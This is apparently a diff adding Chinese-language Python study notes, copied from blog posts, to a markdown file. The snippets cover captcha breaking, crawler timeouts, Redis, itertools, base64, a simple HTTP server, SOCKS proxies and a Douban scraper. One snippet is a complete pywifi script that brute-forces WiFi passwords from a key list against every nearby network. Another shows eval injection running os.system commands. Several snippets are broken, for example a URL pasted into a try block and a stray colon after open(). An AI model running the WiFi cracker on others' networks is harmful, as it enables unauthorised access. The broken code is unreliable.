@@ -900,4 +900,432 @@ pdo_mysql.default_socket=/var/lib/mysql/mysqld.sock // 默认是空的,这个就
 mysqli.default_socket =/var/lib/mysql/mysqld.sock
 php7 以后就不实用mysql这个驱动了 而使用mysqlnd 所以你在phpinfo()里不会再看到mysql项
 重启php-fpm 需要用 ps aux|grep php 命令查看 php-fpm 的 pid,然后 kill pid.这里注意啊 要是多个php-fpm一定要看配置文件位置,不要删错了.
-###[]()
+###[Python 破解验证码](https://zhuanlan.zhihu.com/p/24222942?refer=zimei)
+```js
+#-*- coding:utf8 -*-
+from PIL import Image
+
+im = Image.open("captcha.gif")
+#(将图片转换为8位像素模式)
+im = im.convert("P")
+
+#打印颜色直方图
+print im.histogram()
+
+ his = im.histogram()
+values = {}
+
+for i in range(256):
+    values[i] = his[i]
+
+for j,k in sorted(values.items(),key=lambda x:x[1],reverse = True)[:10]:
+    print j,k
+
+ 得到了图片中最多的10种颜色，其中 220 与 227 才是我们需要的红色和灰色，可以通过这一讯息构造一种黑白二值图片。
+ #-*- coding:utf8 -*-
+from PIL import Image
+
+im = Image.open("captcha.gif")
+im = im.convert("P")
+im2 = Image.new("P",im.size,255)
+
+
+for x in range(im.size[1]):
+    for y in range(im.size[0]):
+        pix = im.getpixel((y,x))
+        if pix == 220 or pix == 227: # these are the numbers to get
+            im2.putpixel((y,x),0)
+
+im2.show()
+
+ 
+```
+###[解释 Python 2 和 Python 3 的版本之间差别](http://python.jobbole.com/87372/)
+```js
+当除法/符号的任一侧的两个数字是整数时，Python 2进行底除法，使得对于商x，返回的数字是小于或等于x的最大整数。这意味着当你写下 5 / 2 来对这两个数字相除时，Python 2.7 将返回最大的小于或等于 2.5 的整数
+5/2=2 为解决这个问题，你可以在 5.0 / 2.0 中添加小数位，以得到预期的答案 2.5
+```
+###[python 高度健壮性爬虫的异常和超时问题](http://python.jobbole.com/87357/)
+```js
+try:
+    passhttp://top.jobbole.com/deliver-article/#
+    #可能出错的语句
+except Exception,e:
+    pass
+    #保留错误的url，留待下次重跑
+    print e
+finally:
+    #无论是否处理了异常都继续运行
+    print time.ctime()
+    
+github：反反爬虫开源库    https://github.com/luyishisi/Anti-Anti-Spider
+selenium+chrome的超时设置
+
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+ 
+driver = webdriver.Firefox()
+driver.get("http://somedomain/url_that_delays_loading")
+try:
+    element = WebDriverWait(driver, 10).until(  #这里修改时间
+        EC.presence_of_element_located((By.ID, "myDynamicElement"))
+    )
+finally:
+    driver.quit()
+    
+from selenium import webdriver
+ 
+driver = webdriver.Firefox()
+driver.implicitly_wait(10) # seconds
+driver.get("http://somedomain/url_that_delays_loading")
+myDynamicElement = driver.find_element_by_id("myDynamicElement")
+
+import time
+import sys
+import os
+def restart_program():
+  python = sys.executable
+  os.execl(python, python, * sys.argv)
+  
+if __name__ == "__main__":
+  print 'start...'
+  print u"3秒后,程序将结束...".encode("utf8")
+  time.sleep(3)
+  restart_program()
+```
+###[Python标准库系列之Redis模块](http://python.jobbole.com/87305/)
+```js
+# 导入模块
+>>> import redis
+# 连接到Redis服务器
+>>> conn = redis.Redis(host='192.168.56.100', port=6379)
+# 写入一条数据
+>>> conn.set('name','ansheng')
+True
+# 获取一条数据
+>>> conn.get('name')
+b'ansheng'
+>>> conn.get('url')
+b'https://blog.ansheng.me'
+
+>>> pool = redis.ConnectionPool(host='192.168.56.100', port=6379)
+>>> conn = redis.Redis(connection_pool=pool)
+>>> conn.set('hello','world')
+True
+>>> conn.get('hello')
+b'world'
+r = redis.Redis(unix_socket_path='/tmp/redis.sock')
+```
+###[一个非常简单易懂的WIFI密码爆破python脚本](http://python.jobbole.com/87277/)
+```js
+ 
+from pywifi import *
+import time
+import sys
+ 
+ 
+ 
+def scans(face,timeout):
+    face.scan()
+    time.sleep(timeout)
+    return face.scan_results()
+ 
+ 
+def test(i,face,x,key,stu,ts):
+    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid
+    for n,k in enumerate(key):
+        x.key = k.strip().replace("\n","")
+        face.remove_all_network_profiles()
+        face.connect(face.add_network_profile(x))
+        code = 10
+        t1 = time.time()
+        while code!=0 :
+            time.sleep(0.1)
+            code = face.status()
+            now = time.time()-t1
+            if now>ts:
+                break
+            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
+            stu.flush()
+            if code == 4:
+                face.disconnect()
+                return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
+    return False
+ 
+ 
+ 
+def main():
+    scantimes = 20
+    testtimes = 25
+    output = sys.stdout
+    files = "TestRes.txt"
+    keys = open(sys.argv[1],"r").readlines()
+    print "|KEYS %s"%(len(keys))
+    wifi = PyWiFi()
+    iface = wifi.interfaces()[0]
+    scanres = scans(iface,scantimes)
+    nums = len(scanres)
+    print "|SCAN GET %s"%(nums)
+    print "%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70)
+    for i,x in enumerate(scanres):
+        res = test(nums-i,iface,x,keys,output,testtimes)
+        if res:
+            open(files,"a").write(res)
+ 
+ 
+ 
+ 
+ 
+if __name__ == '__main__':
+ 
+    main()
+    
+    Python全栈之路 https://blog.ansheng.me/article/python-full-stack-way/ 
+```
+###[高效的 itertools 模块](http://python.jobbole.com/87380/)
+```js
+>>> import itertools
+>>>
+>>> cycle_strings = itertools.cycle('ABC')
+>>> i = 1
+>>> for string in cycle_strings:
+...     if i == 10:
+...         break
+...     print i, string
+...     i += 1
+...
+1 A
+2 B
+3 C
+4 A
+5 B
+6 C
+7 A
+8 B
+9 C
+>>> for item in itertools.repeat('hello world', 3):
+...     print item
+...
+hello world
+hello world
+hello world
+>>> list(compress('ABCDEF', [1, 1, 0, 1, 0, 1]))
+['A', 'B', 'D', 'F']
+>>> list(dropwhile(lambda x: x < 5, [1, 3, 6, 2, 1]))
+[6, 2, 1]
+>>> for key, value_iter in groupby('aaabbbaaccd'):
+...     print key, ':', list(value_iter)
+...
+a : ['a', 'a', 'a']
+b : ['b', 'b', 'b']
+a : ['a', 'a']
+c : ['c', 'c']
+d : ['d']
+>>> list(ifilter(lambda x: x < 6, range(10)))
+[0, 1, 2, 3, 4, 5]
+>>>
+>>> list(ifilter(None, [0, 1, 2, 0, 3, 4]))
+[1, 2, 3, 4]
+>>> list(imap(str, [1, 2, 3, 4]))
+['1', '2', '3', '4']
+>>>
+>>> list(imap(pow, [2, 3, 10], [4, 2, 3]))
+[16, 9, 1000]
+#product 用于求多个可迭代对象的笛卡尔积
+>>> for item in product('ABCD', 'xy'):
+...     print item
+...
+('A', 'x')
+('A', 'y')
+('B', 'x')
+('B', 'y')
+('C', 'x')
+('C', 'y')
+('D', 'x')
+('D', 'y')
+>>> list(permutations('ABC', 2))
+[('A', 'B'), ('A', 'C'), ('B', 'A'), ('B', 'C'), ('C', 'A'), ('C', 'B')]
+>>> list(combinations('ABC', 2))
+[('A', 'B'), ('A', 'C'), ('B', 'C')]
+
+```
+###[Python 之旅](https://funhacks.net/explore-python/)
+https://github.com/ethan-funny/explore-python 
+###[在 Python 中使用 Base64 编码和解码](http://funhacks.net/2016/07/31/base64_usage/)
+Base64，简单地讲，就是用 64 个字符来表示二进制数据的方法，这 64 个字符包含小写字母 a-z、大写字母 A-Z、数字 0-9 以及符号”+”、”/“，其实还有一个 “=” 作为后缀用途，所以实际上有 65 个字符。
+```js
+def convert_local_image():
+    # 原始图片 ==> base64 编码
+    with open('/path/to/alpha.png', 'r') as fin:
+        image_data = fin.read()
+        base64_data = base64.b64encode(image_data)
+        fout = open('/path/to/base64_content.txt', 'w')
+        fout.write(base64_data)
+        fout.close()
+    # base64 编码 ==> 原始图片
+    with open('/path/to/base64_content.txt', 'r') as fin:
+        base64_data = fin.read()
+        ori_image_data = base64.b64decode(base64_data)
+        fout = open('/path/to/beta.png', 'wb'):
+        fout.write(ori_image_data)
+        fout.close()
+	import requests
+def convert_web_image():
+    url = 'https://github.com/reactjs/redux/blob/master/logo/logo.png?raw=true'
+    r = requests.get(url, stream=True)
+    if r.status_code == 200:
+        image_data = r.content
+        base64_data = base64.b64encode(image_data)
+        
+        # 将图片的 base64 编码保存到本地文件
+        with open('/path/to/base64_data.txt', 'w') as fout:
+            fout.write(base64_data)
+        
+        # 下载图片到本地
+        with open('/path/to/redux.png', 'wb') as fout:
+            fout.write(image_data)
+```
+###[快速搭建一个简单的 http 服务](http://funhacks.net/2016/07/24/python_http_server/)
+# python3 的用法
+$ python3 -m http.server <port>
+上面的 HTTP 服务器服务的是网络中的所有主机（0.0.0.0），如果你只想让它在本地有效，可能你会这么尝试 python -m SimpleHTTPServer 127.0.0.1:9000，但这是不支持的。我们可以这么做
+```js
+import sys
+from SimpleHTTPServer import SimpleHTTPRequestHandler
+import BaseHTTPServer
+def serve(HandlerClass=SimpleHTTPRequestHandler,
+         ServerClass=BaseHTTPServer.HTTPServer):
+    protocol = "HTTP/1.0"
+    host = ''
+    port = 8000
+    if len(sys.argv) > 1:
+        arg = sys.argv[1]
+        if ':' in arg:
+            host, port = arg.split(':')
+            port = int(port)
+        else:
+            try:
+                port = int(sys.argv[1])
+            except:
+                host = sys.argv[1]
+    server_address = (host, port)
+    HandlerClass.protocol_version = protocol
+    httpd = ServerClass(server_address, HandlerClass)
+    sa = httpd.socket.getsockname()
+    print "Serving HTTP on", sa[0], "port", sa[1], "..."
+    httpd.serve_forever()
+if __name__ == "__main__":
+    serve()
+
+$ python server.py 127.0.0.1:9000
+Serving HTTP on 127.0.0.1 port 9000 ...
+$ python server.py 8080          
+Serving HTTP on 0.0.0.0 port 8080 ...
+
+```
+在局域网共享资料
+
+利用上面的 http 服务，我们可以简单地实现在局域网共享资料。假设在办公室有两台电脑 host1，host2，它们属于同个局域网，现在我们想将 host1 的某些文件共享给 host2，可以这么做：
+
+进入到 host1 要共享的文件的目录
+在该目录执行命令 python -m SimpleHTTPServer
+使用 ifconfig 命令查看 host1 在局域网的 ip 地址，假设是 192.168.1.3
+在 host2，打开浏览器，输入 http://192.168.1.3:8000 就可以查看到 host1 共享的文件了，然后就可以进行查看或下载了，就这么简单。
+###[Python 如何将字符串转为字典](http://funhacks.net/2016/04/24/python_%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B8%BA%E5%AD%97%E5%85%B8/)
+```js
+>>> json.dumps(data3, sort_keys=True) # 按键排序
+'[{"a": "A", "b": [2, 3], "c": 6.0}]'
+>>> import ast
+>>> userinfo = "{'name' : 'john', 'gender' : 'male', 'age': 28}"
+>>> ast.literal_eval(userinfo)
+{'gender': 'male', 'age': 28, 'name': 'john'}
+
+# 让用户输入 `user_info`
+>>> user_info = raw_input('input user info: ')
+# 输入 {"name" : "john", "gender" : "male", "age": 28}，没问题
+>>> user_dict = eval(user_info)
+# 输入 __import__('os').system('dir')，user_dict 会列出当前的目录文件！
+# 再输入一些删除命令，则可以把整个目录清空了！
+>>> user_dict = eval(user_info)
+```
+###[在 Python 中使用 socks 代理](http://funhacks.net/2016/07/05/python_socks_proxy/)
+```js
+# -*- coding: utf-8 -*-
+import socket
+import socks
+SOCKS5_PROXY_HOST = '127.0.0.1' 
+SOCKS5_PROXY_PORT = 1358  # socks 代理本地端口
+default_socket = socket.socket
+socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT) 
+socket.socket = socks.socksocket
+url = 'https://www.google.com/search?q=linux'
+# 如果你使用 urllib2
+import urllib2
+request = urllib2.Request(url)
+request.add_header("User-Agent", "Mozilla/5.001 (windows; U; NT4.0; en-US; rv:1.0) Gecko/25250101")
+html_source = urllib2.urlopen(request, timeout=10).read()
+# 如果你使用 requests
+import requests
+html_source = requests.get(url, headers={"User-Agent": "Mozilla/5.001 (windows; U; NT4.0; en-US; rv:1.0) Gecko/25250101"}).text
+if html_source:
+    print 'ok'
+else:
+    print 'fail'
+```
+###[python豆瓣爬虫](http://funhacks.net/2015/07/14/douban-movie-spider/)
+```js
+# -*- coding: utf-8 -*-
+import requests
+from bs4 import BeautifulSoup
+# 豆瓣类http://funhacks.net/2015/07/14/douban-movie-spider/
+class DouBan:
+    # 初始化方法，定义一些变量
+    def __init__(self):
+        self.url = 'http://movie.douban.com/'
+        # 伪装成浏览器，防止403错误
+        self.user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
+        # 初始化headers
+        self.headers = {'User-Agent': self.user_agent}
+    # 获取页面html代码
+    def get_page_source(self):
+        # 发起请求
+        r = requests.get(self.url, headers=self.headers,verify=False)
+        # 获取页面html代码
+        page_source = r.text
+        # print str(pageSource)
+        return page_source
+    # 对html代码进行分析，提取电源标题和评分
+    def get_page_item(self):
+        page_source = self.get_page_source()
+        if not page_source:
+            print "load page fail!"
+            return None
+        # 构建BeautifulSoup对象
+        soup = BeautifulSoup(page_source, "lxml")
+        # 解析网页
+        list_soup = soup.find_all('li', {'class': 'ui-slide-item'})
+        file_content = ''
+        count = 1
+        # 提取标题和评分
+        for item in list_soup:
+            try:
+                data_title = item.get('data-title')  # or item['data-title']
+                data_rate = item.get('data-rate')
+                file_content += "%d\t%s\t%s\n" % (count, data_title, data_rate)
+                count += 1
+            except Exception as e:
+                print e
+                # print "key doesn't exist"
+        return file_content
+    # 进行爬虫并保存结果
+    def spider(self):
+        print u"爬取豆瓣热映电源标题和评分"
+        file_content = self.get_page_item().encode('utf-8')
+        f = open('movie_result', 'w')
+        f.write(file_content)
+        f.close()
+douban = DouBan()
+douban.spider()
+```
